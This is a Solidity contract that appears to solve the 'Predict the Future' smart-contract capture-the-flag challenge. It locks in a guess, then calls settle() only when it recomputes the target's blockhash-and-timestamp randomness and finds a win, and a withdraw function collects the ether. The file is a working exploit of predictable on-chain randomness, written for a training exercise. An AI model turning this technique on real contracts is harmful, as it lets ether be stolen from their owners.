pragma solidity ^0.4.21;

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureSolution {
    IPredictTheFutureChallenge challenge;

    event Result(bool);

    function PredictTheFutureSolution(address _challenge) public payable {
        require(msg.value == 1 ether);
        challenge = IPredictTheFutureChallenge(_challenge);
        challenge.lockInGuess.value(1 ether)(5);
    }

    function trickSettle() public {
        uint8 guess =
            uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        if (guess == 5) {
            challenge.settle();
            // require(address(this).balance >= 2 ether);
        }
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}
